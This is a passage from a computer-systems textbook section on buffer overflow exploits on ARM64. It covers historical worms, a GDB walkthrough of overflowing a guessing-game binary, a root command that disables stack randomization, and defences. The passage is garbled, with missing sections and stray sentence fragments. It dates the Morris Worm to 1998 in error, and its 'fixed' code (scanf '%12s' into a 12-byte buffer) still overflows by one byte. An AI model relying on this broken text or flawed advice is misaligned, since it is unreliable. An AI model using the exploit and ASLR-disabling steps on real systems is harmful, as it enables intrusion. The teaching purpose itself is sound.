## [](#_real_world_buffer_overflow){.anchor}9.10. Real World: Buffer Overflow {#_real_world_buffer_overflow}

::: sectionbody
::: paragraph
The C language does not perform automatic array bounds checking.
Accessing memory outside of the bounds of an array is problematic and
often results in errors such as segmentation faults. However, a clever
attacker can inject malicious code that intentionally overruns the
boundary of an array (also known as a **buffer**) to force the program
to execute in an unintended manner. In the worst cases, the attacker can
run code that allows them to gain **root privilege**, or OS-level access
to the computer system. A piece of software that takes advantage of the
existence of a known buffer overrun error in a program is known as a
**buffer overflow exploit**.
:::

::: paragraph
In this section, we use GDB and assembly language to fully characterize
the mechanics of a buffer overflow exploit. Prior to reading this
chapter we encourage you to explore the chapter discussing [GDB for
inspecting assembly
code](../C3-C_debug/gdb_assembly.html#_debugging_assembly_code){.page}.

### [](#_famous_examples_of_buffer_overflow){.anchor}9.10.1. Famous Examples of Buffer Overflow {#_famous_examples_of_buffer_overflow}

::: paragraph
Buffer overflow exploits emerged in the 1980s and remained a chief
scourge of the computing industry through the early parts of the 2000s.
While many modern operating systems have protections against the
simplest buffer overflow attacks, careless programming errors can still
leave modern programs wide open to attack. Buffer overflow exploits have
recently been discovered in Skype^1^, Android^2^, Google Chrome^3^, and
others.
:::

::: paragraph
Here are some notable historic examples of buffer overflow exploits.
:::

::: dlist

The Morris Worm

:   The Morris Worm^4^ was released in 1998 on ARPANet from MIT (to hide
    that it was written by a student at Cornell) and exploited a buffer
    overrun vulnerability that existed in the Unix finger daemon
    (`fingerd`). In Linux and other Unix-like systems, a **daemon** is a
    type of process that continuously executes in the background,
    usually performing clean-up and monitoring tasks. The `fingerd`
    daemon returns a user-friendly report on a computer or person. Most
    crucially, the worm had a replication mechanism that caused it to be
    sent to the same computer multiple times, bogging down the system to
    an unusable state. While the author claimed that the worm was meant
    as a harmless intellectual exercise, the replication mechanism
    enabled the worm to spread easily and made it difficult to remove.
    In future years, other worms would employ buffer overflow exploits
    to gain unauthorized access into systems. Notable examples include
    Code Red (2001), MS-SQLSlammer (2003), and W32/Blaster (2003).

AOL Chat Wars

:   David Auerbach^5^, a former Microsoft engineer, detailed his
    experience with a buffer overflow during his efforts to integrate
    Microsoft's Messenger Service (MMS) with AOL Instant Messenger in
    the late 1990s. Back then, AOL Instant Messenger (AIM) was *the*
    service to use if you wanted to instant message (or IM) friends and
    family. Microsoft tried to gain a foothold in this market by
    designing a feature in MMS that enabled MMS users to talk to their
    AIM \"buddies.\" Displeased, AOL patched their servers so that MMS
    could no longer connect to them. Microsoft engineers figured out a
    way for MMS clients to mimic the messages sent by AIM clients to AOL
    servers, making it difficult for AOL to distinguish between messages
    received by MMS and AIM. AOL responded by changing the way AIM sent
    messages, and MMS engineers duly changed their client's messages to
    once again match AIM's. This \"chat war\" continued until AOL
    started using a buffer overflow error *in their own client* to
    verify that sent messages came from AIM clients. Since MMS clients
    did not have the same vulnerability, the chat wars ended, with AOL
    as the victor.

This game prompts the user to enter first a secret number and then a
secret string to win the guessing game. The header file `other.h`
contains the definition of the `getSecretCode` and `calculateValue`
functions, but it is unavailable to us. How then can a user beat the
program? Brute forcing the solution will take too long. One strategy is
to analyze the `secret` executable in GDB and step through the assembly
to reveal the secret number and string. The process of examining
assembly code to reveal knowledge of how it works is commonly referred
to as **reverse engineering**. Readers comfortable enough with GDB and
reading assembly should be able to use GDB to reverse engineer the
secret number and the secret string.

The program contains a potential buffer overrun vulnerability at the
first call to `scanf`. To understand what is going on, let's inspect the
assembly code of the `main` function using GDB. Let's also place a
breakpoint at address 0x0000aaaaaaaaa92c, which is the address of the
instruction right before the call to `scanf` (placing the breakpoint at
the address for `scanf` causes program execution to halt *inside* the
call to `scanf`, not in `main`) and then use `ni` to advance forward one
instruction:

Prior to the call to `scanf`, the first two arguments for `scanf` are
preloaded into registers `x0` and `x1`, respectively. The address of
array `buf` is stored at stack location `x29+0x18` (see
`<playGame+28>`).

GDB to print its value (`p x29`). In the example shown, the saved value
of `x29` is 0xffffffffeef0. The following command allows the reader to

The input string is so long that it not only overwrote the saved `x29`

the program tries to resume execution at the address specified by the

at address 0xffff00353433 after exiting `main`, which does not appear to

filling the call stack with data more meaningful than junk values. For
example, we could overwrite the stack so that the return address is
replaced with the address of `endGame`. Then, when the program attempts
to return from `main`, it will instead execute `endGame` instead of
crashing.

        printf("%c", ebuff[i]);
    }
    return 0;

```
:::
:::

::: paragraph
The `\x` before each number indicates that the number is formatted as
the hexadecimal representation for a character. After defining
`ebuff[]`, the `main` function simply prints it out, character by
character. To get the associated byte string, compile and run this
program as follows:
:::

To use `exploit` as input to `scanf`, it suffices to run `secret` with
`exploit`. To get the exploit to work on a Raspberry Pi, type the
following set of commands as root (we will explain what is going on
following the example):
:::

::: listingblock
::: content
    $ sudo su
    [sudo] password for pi:
    root@pi# echo "0" > /proc/sys/kernel/randomize_va_space
    root@pi# exit
    $
:::
:::

::: paragraph
The `sudo su` command puts you in root mode on the Raspberry Pi. When
prompted for a password, use your password (we assume you have root
access to the Raspberry Pi). As soon as the password is entered, the
next set of commands are typed in root mode. Note that the command
prompt changes when a user is in root mode (it looks something like
`root@pi#`).
:::

::: paragraph
The `echo` command overwrites the contents of the file
`randomize_va_space` with the value 0. Next, the `exit` command returns
the user back to user mode.
:::

::: paragraph
Now, type the following command at the prompt:
:::

::: listingblock
::: content
    $ ./secret < exploit
    Enter secret number:
    You are so wrong!

:::
:::

::: paragraph
The program prints out \"You are so wrong!\" because the string
contained in `exploit` is *not* the secret number. However, the program
also prints out the string \"You win!\" Recall, though, that our goal is
to trick the program to return 0. In a larger system, where the notion
of \"success\" is tracked by an external program, it is often most
important what a program returns, not what it prints out.

### [](#_protecting_against_buffer_overflow){.anchor}9.10.6. Protecting Against Buffer Overflow {#_protecting_against_buffer_overflow}

::: paragraph
The example we showed changed the control flow of the `secret`
executable, forcing it to return a zero value associated with success.
We had to accomplish this in a fairly wonky way due to stack protections
that ARM and GCC include to combat this particular type of attack.
However, buffer overflow exploits can do real damage on older systems.
Some older computer systems also *executed* bytes from stack memory. If
an attacker placed bytes associated with assembly instructions on the
call stack, the CPU would interpret the bytes as *real* instructions,
enabling the attacker to force the CPU to execute *any arbitrary code of
their choosing*. Fortunately, there are strategies that modern computer
systems employ to make it more difficult for attackers to run buffer
overflow exploits:
:::

::: ulist
-   **Stack randomization**: The OS allocates the starting address of
    the stack at a random location in stack memory, causing the
    position/size of the call stack to vary from one run of a program to
    another. When we overwrote the `/proc/sys/kernel/randomize_va_space`
    file with a 0 value, we temporarily turned off stack randomization
    on the Raspberry Pi (this file returns to its original value on
    restart). Without turning off stack randomization, multiple machines
    running the same code would have different stack addresses. Modern
    Linux systems use stack randomization as a standard practice.
    However, a determined attacker can brute force the attack, by
    attempting to repeat attacks with different addresses. A common
    trick is to use a **NOP sled** (i.e., a large number of NOP
    instructions) before the actual exploit code. Executing the NOP
    instruction (`0x90`) has no effect, other than causing the program
    counter to increment to the next instruction. As long as the
    attacker can get the CPU to execute somewhere in the NOP sled, the
    NOP sled will eventually lead to the exploit code that follows it.
    Aleph One's writeup, *Smashing the Stack for Fun and Profit*^6^
    details the mechanism of this type of attack.

-   **Stack corruption detection**: Another line of defense is to try to
    detect when the stack is corrupted. Recent versions of GCC use a
    stack protector known as a **canary** that acts as a guard between
    the buffer and the other elements of the stack. A canary is a value
    stored in a nonwriteable section of memory that can be compared to a
    value put on the stack. If the canary \"dies\" during a program's
    execution, the program knows that it is under attack and aborts with
    an error message. For simplicity, we removed the canary from our
    `secret` executable by compiling it with the `fno-stack-protector`
    flag in GCC. However, a clever attacker can replace the canary
    during the course of the attack to prevent the program from
    detecting stack corruption.

-   **Limiting executable regions**: In this line of defense, executable
    code is restricted to only particular regions of memory. In other
    words, the call stack is no longer executable. However, even this
    defense can be defeated. In an attack utilizing **return-oriented
    programming** (ROP), an attacker can \"cherry-pick\" instructions in
    executable regions, and jump from instruction to instruction to
    build an exploit. There are some famous examples of this on-line,
    especially in video games^7^.

However, the best line of defense is always the programmer. To prevent
buffer overflow attacks on your programs, use C functions with **length
specifiers** whenever possible and add code that performs array bounds
checking. It is crucial that any defined arrays match the chosen length
specifiers. [Table 1](#specifiersa64) lists some common \"bad\" C
functions that are vulnerable to buffer overflow, and the corresponding
\"good\" function to use (assume that `buf` is allocated 12 bytes):
:::

+-----------------------------------+-----------------------------------+
| Instead of                        | Use                               |
+===================================+===================================+
| `gets(buf)`                       | `fgets(buf, 12, stdin)`           |
+-----------------------------------+-----------------------------------+
| `scanf("%s", buf)`                | `scanf("%12s", buf)`              |
+-----------------------------------+-----------------------------------+
| `strcpy(buf2, buf)`               | `strncpy(buf2, buf, 12)`          |
+-----------------------------------+-----------------------------------+
| `strcat(buf2, buf)`               | `strncat(buf2, buf, 12)`          |
+-----------------------------------+-----------------------------------+
| `sprintf(buf, "%d", num)`         | `snprintf(buf, 12, "%d", num)`    |
+-----------------------------------+-----------------------------------+

: Table 1. C Functions with Length Specifiers

::: paragraph
The `secret2` binary
([secret2ARM64.tar.gz](_attachments/secret2ARM64.tar.gz)) no longer has
the buffer overflow vulnerability. The `playGame` function of this new
binary ([main2.c](_attachments/main2.c)) appears below:
:::

::: listingblock
::: content
``` {.highlightjs .highlight}
int playGame(void){
  int guess, secret, len, x=3;
  char buf[12];
  printf("Enter secret number:\n");
  scanf("%12s", buf); //lengths specifier added here!
  guess = atoi(buf);
  secret=getSecretCode();
  if (guess == secret)
    printf("You got it right!\n");
  else{
    printf("You are so wrong!\n");
    return 1;
  }
  printf("Enter the secret string to win:\n");
  scanf("%12s", buf); //length specifier added here!
  guess = calculateValue(buf, strlen(buf));
  if (guess != secret){
    printf("You lose!\n");
    return 2;
  }
  endGame();
  return 0;
}
```
:::
:::

::: paragraph
Notice that we added a length specifier to all calls of `scanf`, causing
the `scanf` function to stop reading from input after the first 12 bytes
are read. The exploit string no longer breaks the program:
:::

::: listingblock
::: content
    $ ./secret2 < exploit
    Enter secret number:
    You are so wrong!
    $ echo $?
    1
:::
:::

::: paragraph
Of course, any reader with basic reverse-engineering skills can still
win the guessing game by analyzing the assembly code. If you haven't
tried to beat the program yet with reverse engineering, we encourage you
to do so now.
